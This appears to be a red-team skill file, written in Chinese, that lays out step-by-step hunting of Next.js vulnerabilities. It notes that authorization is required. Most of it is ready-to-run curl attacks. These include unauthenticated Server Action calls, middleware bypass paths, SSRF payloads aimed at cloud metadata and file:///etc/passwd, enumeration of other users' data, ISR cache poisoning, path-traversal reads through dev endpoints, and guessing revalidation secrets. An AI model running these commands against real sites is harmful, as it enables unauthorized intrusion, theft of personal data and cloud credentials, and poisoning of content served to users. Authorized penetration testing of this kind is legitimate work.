---
name: hunt-nextjs
description: 狩猎 Next.js 特有漏洞 — Server Actions 任意函数执行、经静态资源路径绕过中间件鉴权、ISR 缓存投毒、图片优化 SSRF（/_next/image）、RSC payload 泄露、getServerSideProps 注入、source map 暴露、调试端点泄露。当目标运行 Next.js 13/14/15 或任何 React SSR 框架时使用。
version: 1.1.0
revision_date: 2026-07-25
license: MIT
platforms: [linux]
metadata:
  tags: [nextjs, hunt, redteam, javascript]
  category: redteam
---

# HUNT-NEXTJS — Next.js / SSR 框架漏洞

## When to Use

- 目标运行 Next.js 13/14/15 或任何 React SSR 框架。

## Prerequisites

- 针对目标取得明确授权、目标边界与速率限制。
- 工具：`curl`、`python3`。
- 可写的证据目录：`export OUTPUT_DIR="${OUTPUT_DIR:-./output}" && mkdir -p "$OUTPUT_DIR"`。
- 对任何会改变状态的步骤（写入、上传、凭据尝试），在执行命令前立即取得明确确认。

## How to Run

```bash
# Set once per engagement; every step below uses these.
TARGET="example.com"   # or the engagement target
export OUTPUT_DIR="${OUTPUT_DIR:-./output}"

# Confirm Next.js and get build ID
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Eo '"buildId":"[^"]+"'
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"

# Extract build ID for /_next/data/ paths
BUILD_ID=$(curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Po '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Check Next.js version via package disclosure
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/_next/static/chunks/framework*.js | grep -Eo '"next":"[^"]+"'

# Source map exposure
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

## Procedure

以下各阶段即为操作流程。保持每个探测请求有界（`--max-time`），把证据记录到 `OUTPUT_DIR` 下，并在 Pitfalls 中列出的停止条件处停止。

## 核心高价值目标

可绕过鉴权或达成 SSRF 的 Next.js 特有漏洞 = High/Critical。

**最高价值链条：**
- **Server Actions 鉴权绕过** — Server Actions 仅在客户端强制鉴权 → 直接调用 action ID → 未授权的数据篡改或外带
- **经 `/_next/static/` 绕过中间件** — 中间件跳过静态资源路径 → 通过 `/_next/data/` 的 IDOR 访问受保护路由
- **`/_next/image` SSRF** — 图片优化器抓取攻击者可控的 URL → 内网扫描或云元数据
- **ISR 陈旧缓存投毒** — 向缓存页面注入恶意内容，随后被投递给所有用户
- **RSC payload 泄露** — React Server Component flight 数据中包含本不应下发给客户端的服务端 props

---

## 攻击面信号

```
/_next/image?url=&w=&q=          Image optimizer — SSRF candidate
/_next/data/BUILD_ID/*.json      Prerendered page data — IDOR candidate
/__nextjs_original-stack-frame   Debug stack frame endpoint
/_next/static/chunks/            JS bundles — source map candidate
/api/                            API routes — standard hunt surface
__NEXT_DATA__ in HTML            SSR props leaked to client
x-nextjs-* response headers      Confirms Next.js
```

---

## 阶段 1 — 指纹与版本识别

```bash
# Confirm Next.js and get build ID
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Eo '"buildId":"[^"]+"'
curl --max-time 30 --connect-timeout 10 -sI https://$TARGET/ | grep -i "x-powered-by\|x-nextjs"

# Extract build ID for /_next/data/ paths
BUILD_ID=$(curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Po '"buildId":"\K[^"]+')
echo "Build ID: $BUILD_ID"

# Check Next.js version via package disclosure
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/_next/static/chunks/framework*.js | grep -Eo '"next":"[^"]+"'

# Source map exposure
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/static/chunks/pages/index.js.map" | head -5
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/static/chunks/main.js.map" | head -5
```

---

## 阶段 2 — Server Actions 滥用

```bash
# Server Actions in Next.js 14+ use x-action-id or Next-Action header
# Find action IDs in HTML source or JS bundles
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | grep -Eo '"action":"[a-f0-9]+"'
grep -r "createActionURL\|$$ACTION_" recon/$TARGET/ --include="*.js" 2>/dev/null

# Call Server Action directly without auth
curl --max-time 30 --connect-timeout 10 -s -X POST https://$TARGET/target-page \
  -H "Next-Action: ACTION_ID_HERE" \
  -H "Content-Type: multipart/form-data; boundary=----" \
  -H "Cookie: " \
  --data-raw $'------\r\nContent-Disposition: form-data; name="1"\r\n\r\n[]\r\n------\r\n'

# Test: does the action execute without a valid session?
# If it returns data or mutates state → auth enforcement is client-side only
```

---

## 阶段 3 — 中间件鉴权绕过

```bash
# Next.js middleware runs on edge runtime and may skip certain paths
# Test protected route directly
curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" https://$TARGET/admin/dashboard
# → 200 means accessible

# Test via /_next/data/ (SSG/ISR JSON) — middleware may not apply
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/data/$BUILD_ID/admin/dashboard.json"

# Test via static asset path prefix (middleware matcher may exclude /_next/static)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/static/../admin/dashboard"

# Encoded path bypass
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/%5Fnext/data/$BUILD_ID/admin/users.json"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/data/$BUILD_ID/..%2Fadmin%2Fusers.json"
```

---

## 阶段 4 — 图片优化 SSRF（`/_next/image`）

```bash
# Basic SSRF test — internal metadata
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/image?url=http://169.254.169.254/latest/meta-data/&w=64&q=75"

# Protocol bypass attempts
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/image?url=file:///etc/passwd&w=64&q=75"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/image?url=http://127.0.0.1:6379/&w=64&q=75"

# OOB detection — use a UNIQUE per-test subdomain so callbacks can't be confused
COLLAB="http://UNIQUE.COLLAB_HOST"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/image?url=$COLLAB/nextjs-ssrf&w=64&q=75"
# Check Interactsh/Burp Collaborator for DNS/HTTP callback on that exact subdomain
```

**误报防护（宣称 SSRF 之前必读）：** `/_next/image` 只会抓取 `next.config.js` 中 `images.remotePatterns` / `images.domains` 允许的 URL。不在白名单中的 `url` **默认返回 400** — 那是优化器正常的白名单拒绝，而不是你绕过了某种「拦截」。**200** 返回的是*经过优化的图片*，而不是上游响应体，因此仅凭状态码永远不能确认 SSRF。只能通过**向唯一的 Collaborator 子域名发起带外回调**（见上）来确认，或通过对已知内网目标与已知外网目标做响应体差异对比来确认。不要基于状态码提交报告。

> 说明：CVE-2024-34351（Next.js SSRF，GHSA-fr5h-rqp8-mj6g，影响 13.4.0
> 至 < 14.1.1，在 14.1.1 修复）是一个 **Server Actions** SSRF — 由信任 `Host`
> 头的相对重定向导致 — 不是 `/_next/image` 的缺陷，也**不**影响
> Vercel 这类按 Host 路由的提供方。Server Actions 攻击面见阶段 2。

---

## 阶段 5 — `/_next/data/` IDOR 与数据泄露

```bash
# Enumerate prerendered JSON for user-specific data
# Pattern: /_next/data/BUILD_ID/[page].json or /_next/data/BUILD_ID/[dynamic]/[id].json
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/data/$BUILD_ID/profile.json" \
  -H "Cookie: session=VICTIM_SESSION"

# Try other users' data
for ID in 1 2 3 100 1000; do
  curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/data/$BUILD_ID/users/$ID.json" | head -3
done

# Check __NEXT_DATA__ in HTML for sensitive server-side props
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/dashboard" | \
  python3 -c "import sys,re,json; m=re.search(r'<script id=\"__NEXT_DATA__\"[^>]*>(.*?)</script>',sys.stdin.read(),re.S); print(json.dumps(json.loads(m.group(1)),indent=2) if m else 'not found')"
```

---

## 阶段 6 — ISR 缓存投毒

```bash
# ISR pages regenerate on request after revalidation period
# If user input influences the static page content without sanitization:
# 1. Trigger revalidation with malicious input in URL/query
# 2. Injected content cached and served to all users

# Test: does query param affect cached page content?
# Use a UNIQUE marker (not a generic <script>) so a match proves YOUR input landed,
# and confirm the response was actually CACHED + served to a DIFFERENT client.
MARK="zqx$(date +%s)"
# 1) Poison with the marker
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/blog/test-post?preview=<b>$MARK</b>" -o /dev/null
# 2) Re-fetch the CLEAN url (no query) from a fresh client and grep the marker.
#    Body-diff clean-vs-poisoned and check x-nextjs-cache / age headers — a reflected
#    marker WITHOUT proof it persists in the cache key is just reflection, not poisoning.
curl --max-time 30 --connect-timeout 10 -si "https://$TARGET/blog/test-post" | grep -iE "$MARK|x-nextjs-cache|age:"

# On-demand revalidation endpoint (if exposed)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/revalidate?secret=GUESS&path=/blog/test"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/api/revalidate?token=GUESS&path=/admin"
```

---

## 阶段 7 — 调试与堆栈帧端点

**前提条件：** `__nextjs_launch-editor` 和 `__nextjs_original-stack-frame`
是由 react-dev-overlay 中间件提供的，仅在 `next dev` 下挂载。生产构建
（`next build && next start`）不会注册这些路由 — 此处返回 404 是正常且
预期的结果，而不是需要你绕过的「过滤」。只有在极罕见的误配置 — 在生产环境
真的运行 `next dev` — 时才可达。把任何非 404 视为真实发现；不要把
404/被过滤的响应作为确认依据。

```bash
# First confirm dev mode is actually exposed (anything but 404 = dev server in prod)
curl --max-time 30 --connect-timeout 10 -s -o /dev/null -w "%{http_code}" \
  "https://$TARGET/__nextjs_original-stack-frame?isServer=true&errorMessage=test"

# Only if the above is NOT 404: the launch-editor / stack-frame endpoints can
# reference local files (file-read surface of a dev server wrongly exposed)
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/__nextjs_launch-editor?file=../../etc/passwd&line=1"
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/__nextjs_original-stack-frame" \
  --data '{"file":"/etc/passwd","line":1,"column":1}'
```

---

## 阶段 8 — 环境变量泄露

```bash
# NEXT_PUBLIC_* vars are baked into JS bundles — grep for secrets
curl --max-time 30 --connect-timeout 10 -s "https://$TARGET/_next/static/chunks/pages/_app.js" | \
  grep -oE "NEXT_PUBLIC_[A-Z_]+['\"]?\s*[:=]\s*['\"]?[^'\"&\s]+"

# Check for non-public vars accidentally exposed
curl --max-time 30 --connect-timeout 10 -s https://$TARGET/ | python3 -c "
import sys, re, json
m = re.search(r'__NEXT_DATA__.*?({.*?})</script>', sys.stdin.read(), re.S)
if m:
    d = json.loads(m.group(1))
    print(json.dumps(d.get('props', {}), indent=2))
"
```

---

## 利用链条表

| Next.js 发现 | 可链接至 | 影响 |
|----------------|----------|--------|
| Server Action 无鉴权 | 直接调用特权 mutation | 数据操纵 / 管理员权限 |
| `/_next/image` SSRF | 云元数据 → IAM 凭据 | 云环境失陷 |
| `/_next/data/` IDOR | 其他用户的服务端 props | PII / 令牌外带 |
| 中间件绕过 | 受保护的管理路由 | 鉴权绕过 |
| source map 暴露 | 重建 TS 源码 → 发现硬编码密钥 | 进一步漏洞 |
| `__NEXT_DATA__` 泄露 | HTML 中的服务端密钥 | API 密钥 / 令牌 |

---

## Pitfalls
- **生产环境中的 Next.js source map** — `/_next/` 下的 `.map` 文件属于信息泄露（源码可见），而非 RCE。
- **`_next/data` 端点枚举** — build ID + data 端点会暴露服务端 props。测试敏感数据是否经由 getServerSideProps 传递。
- **中间件绕过** — Next.js 中间件运行在 Edge 上。测试 `/api/` 路径能否通过直接访问绕过中间件。
- **ISR 缓存投毒** — 如果重新验证的触发条件可控，增量静态再生成（ISR）就可能被投毒。

---

## Verification

✅ Server Action：action 在无有效会话时执行，返回数据或改变状态
✅ SSRF：从 `/_next/image` SSRF 收到 DNS/HTTP 回调
✅ 中间件绕过：无鉴权 Cookie 时在受保护路由获得 200 响应
✅ 数据泄露：`__NEXT_DATA__` 包含非公开密钥或其他用户的 PII

**严重性：**
- Server Action 鉴权绕过 → 数据篡改：High/Critical
- 图片 SSRF → 云元数据：Critical
- 中间件绕过 → 管理面板：High
- 仅 source map 暴露：Low-Medium

---

